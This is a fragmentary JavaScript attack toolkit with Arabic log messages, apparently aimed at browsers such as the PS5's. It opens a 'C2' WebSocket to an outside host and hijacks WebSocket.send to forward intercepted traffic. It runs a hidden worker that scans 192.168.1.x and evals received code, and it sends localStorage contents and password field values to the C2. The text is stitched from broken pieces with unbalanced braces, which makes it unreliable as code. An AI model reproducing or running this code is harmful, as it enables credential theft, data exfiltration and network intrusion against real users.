const wait = ms => new Promise(r => setTimeout(r, ms));

  document.getElementById('sHigh').textContent = `🟣 ${stats.high}`;
  document.getElementById('sMedium').textContent = `🔵 ${stats.med}`;
}

function markSuccess(level) {
  stats.ok++;
  if (level === 'crit') stats.crit++;
  else if (level === 'high') stats.high++;
  else if (level === 'med') stats.med++;
  updateStats();

let c2ws = null;
function connectC2() {
  L('[📡] C2 Beacon...', 'warn');
  try {
    const url = 'wss://echo.websocket.org';
    c2ws = new WebSocket(url);
    c2ws.onopen = () => L('[✅] C2 متصل', 'ok');
    c2ws.onmessage = e => L(`[C2] ${e.data}`, 'ptr');
    c2ws.onerror = () => L('[❌] C2 فشل (متوقع على PS5)', 'err');
  } catch(e) {
    L(`[❌] C2: ${e.message}`, 'err');
    L('[!] طبيعي — WebSocket محظور على بعض الشبكات', 'warn');
  }
}

function sendC2(data) {
  if (c2ws && c2ws.readyState === WebSocket.OPEN) {
    c2ws.send(JSON.stringify(data));
  }
}

      const text = data instanceof ArrayBuffer ? new TextDecoder().decode(data) : String(data);
      L(`[WS] اعترض: ${text.slice(0,60)}...`, 'ptr');
      sendC2({ type: 'ws', data: text });
      return orig.call(this, data);
    };
    L('[✅] WebSocket.send مختطف', 'ok');
    markSuccess('crit');
    return true;
  } catch(e) {

}

// ===================== 5. WEBWORKER =====================
async function exploitWorker() {
  L('── ⚙️ WebWorker ──', 'sep');
  try {
    const code = `
      self.onmessage = function(e) {
        if (e.data.type === 'scan') {
          for (let i = 1; i < 20; i++) {
            fetch('http://192.168.1.' + i + ':80/')
              .then(() => self.postMessage({type:'host', ip:'192.168.1.'+i}))
              .catch(() => {});
          }
        }
        if (e.data.type === 'exec') {
          try { self.postMessage({type:'result', data: eval(e.data.code)}); }
          catch(err) { self.postMessage({type:'error', msg: err.message}); }
        }
      };
      setInterval(() => self.postMessage({type:'heartbeat'}), 5000);
    `;
    const blob = new Blob([code], { type: 'application/javascript' });
    const url = URL.createObjectURL(blob);
    const w = new Worker(url);
    
    w.onmessage = e => {
      if (e.data.type === 'host') L(`[Worker] 🖥️ ${e.data.ip}`, 'ok');
      if (e.data.type === 'result') L(`[Worker] ${e.data.data}`, 'ptr');
      if (e.data.type === 'heartbeat') {} // silent
    };
    
    w.postMessage({ type: 'scan' });
    w.postMessage({ type: 'exec', code: 'navigator.userAgent' });
    
    L('[✅] Worker في الخلفية — يمسح الشبكة', 'ok');
    markSuccess('med');
    return w;
  } catch(e) {
    L(`[❌] ${e.message}`, 'err');
    return null;
  }
}

      ls[k] = localStorage.getItem(k);
    }
    L(`[+] LocalStorage: ${Object.keys(ls).length} مفتاح`, 'ok');
    sendC2({ type: 'localstorage', data: ls });
    
    // محاولة قراءة حقول كلمة المرور
    const inputs = document.querySelectorAll('input[type="password"]');
    for (const inp of inputs) {
      inp.focus();
      inp.dispatchEvent(new Event('focus', { bubbles: true }));

        L(`[!] كلمة مرور: ${inp.value.slice(0,4)}...`, 'crit');
        sendC2({ type: 'password', name: inp.name, value: inp.value });
